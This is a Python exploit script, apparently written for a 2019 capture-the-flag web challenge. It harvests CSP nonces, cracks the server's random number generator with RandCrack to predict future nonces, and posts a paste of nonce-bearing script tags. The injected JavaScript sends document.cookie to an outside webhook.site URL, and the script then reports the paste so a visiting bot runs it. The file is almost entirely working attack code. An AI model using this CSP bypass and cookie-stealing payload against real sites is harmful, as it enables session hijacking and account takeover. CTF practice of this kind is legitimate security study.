#!/usr/bin/python3
import requests
import re
import json 
from base64 import b64decode, b64encode
import binascii
import random
import time


from randcrack import RandCrack

s = requests.Session()

def convert(number):
    return str(b64encode(binascii.unhexlify(hex(number)[2:].zfill(32))), encoding="ascii")

r = random.getrandbits(128)
x = convert(r)
assert r == int(binascii.hexlify(b64decode(x)), 16)

# print(r, int(binascii.hexlify(b64decode(x)), 16))


payload = '''
location='https://webhook.site/4c65fa74-18f4-4676-8eaf-8262779ba9ab/?q='+btoa(document.cookie);
'''


def getNonces():
    rc = RandCrack()
    scripts = '<script></script>'*(628//4)
    r = s.post('https://naas.2019.chall.actf.co/nonceify', data=scripts)
    r = json.loads(r.text) 

    nonces = re.findall(r'''nonce-([^']+)''', r["csp"])
    nonces = map(lambda x: int(binascii.hexlify(b64decode(x)), 16), nonces)
    for nonce in nonces:
        n = nonce
        try:
            while n > 0:
                rc.submit(n % (1 << 32))
                n = n >> 32
        except:
            print("{}, {}".format(nonce, rc.predict_getrandbits(128)))
    scripts = ''
    for i in range(0, 16):
        next_nonce = convert(rc.predict_getrandbits(128))
        scripts += '''<script nonce="{}">{}</script>'''.format(next_nonce, payload)
    r = s.post('https://paste.2019.chall.actf.co', data={"paste":scripts})

    s.post('https://paste.2019.chall.actf.co/report', json={"url":r.url})
    print(r.text, r.url)
    
getNonces()
